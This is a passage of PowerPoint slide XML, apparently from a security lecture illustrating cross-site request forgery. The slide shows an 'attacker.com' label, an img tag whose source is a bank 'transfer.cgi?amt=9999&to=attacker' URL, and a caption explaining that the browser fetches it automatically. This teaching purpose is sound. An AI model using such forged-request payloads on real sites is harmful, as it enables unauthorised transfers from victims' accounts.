              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:spcBef>
                <a:spcPts val="27"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="70558" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:endParaRPr sz="1765" b="1" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="Straight Arrow Connector 13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="4090147" y="1882588"/>
            <a:ext cx="4398309" cy="987519"/>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9" name="Straight Arrow Connector 8"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="4171390" y="2353236"/>
            <a:ext cx="4317066" cy="910478"/>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16" name="object 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4143376" y="2510118"/>
            <a:ext cx="4574801" cy="1591235"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="6572884" h="2263140">
                <a:moveTo>
                  <a:pt x="6389268" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="1457705"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="183616" y="2262530"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6572884" y="804824"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6389268" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1">
            <a:schemeClr val="accent5"/>
          </a:lnRef>
          <a:fillRef idx="2">
            <a:schemeClr val="accent5"/>
          </a:fillRef>
          <a:effectRef idx="1">
            <a:schemeClr val="accent5"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="dk1"/>
          </a:fontRef>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="object 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="20880000">
            <a:off x="4406714" y="3166833"/>
            <a:ext cx="3478026" cy="192360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:lnSpc>
                <a:spcPts val="1545"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1588" b="1" spc="-4" dirty="0" err="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0" err="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>=“http://HabibBank</a:t>
            </a:r>
            <a:endParaRPr sz="1588" b="1" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81935" name="object 14"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="-720000">
            <a:off x="4462743" y="3282986"/>
            <a:ext cx="4416519" cy="205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714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="1588"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>transfer.cgi?amt=9999&amp;to=attacker”&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81936" name="object 26"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2196353" y="5104280"/>
            <a:ext cx="3308537" cy="1426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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2294" b="1">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Browser automatically  visits the URL to obtain  what it believes will be  an image</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2294">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81937" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8517872" y="4406713"/>
            <a:ext cx="1881187" cy="1495985"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId6"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81938" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8533279" y="4437530"/>
            <a:ext cx="1809750" cy="1420346"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81939" name="object 12"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8533279" y="4437530"/>
            <a:ext cx="1809750" cy="1420346"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 2586990"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 7803 w 2586990"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 7803 w 2586990"/>
              <a:gd name="T5" fmla="*/ 28269 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 2586990"/>
              <a:gd name="T7" fmla="*/ 28269 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 2586990"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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86990" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2586685" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2586685" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00D026">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81940" name="object 24"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8691563" y="4920784"/>
            <a:ext cx="1383926" cy="3590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11113">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
